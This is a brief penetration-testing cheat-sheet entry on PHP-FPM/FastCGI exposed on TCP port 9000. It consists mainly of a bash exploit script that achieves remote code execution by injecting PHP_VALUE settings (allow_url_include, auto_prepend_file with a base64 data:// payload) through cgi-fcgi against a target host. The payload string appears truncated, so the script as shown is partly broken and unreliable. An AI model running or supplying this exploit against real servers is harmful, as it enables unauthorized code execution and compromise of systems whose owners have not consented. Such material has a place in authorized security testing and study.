PHP-FPM/FastCGI (TCP/9000)

PHP-FPM (FastCGI Process Manager) is an alternative to the traditional PHP CGI interface

Exploitation

    RCE

      Using the following code we are able to achieve Remote Code Execution:

      Remember to change the FILENAMES value and point to a valid php file inside the target machine

      #!/bin/bash

PAYLOAD="';" 
FILENAMES="/var/www/public/index.php" # Existing file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
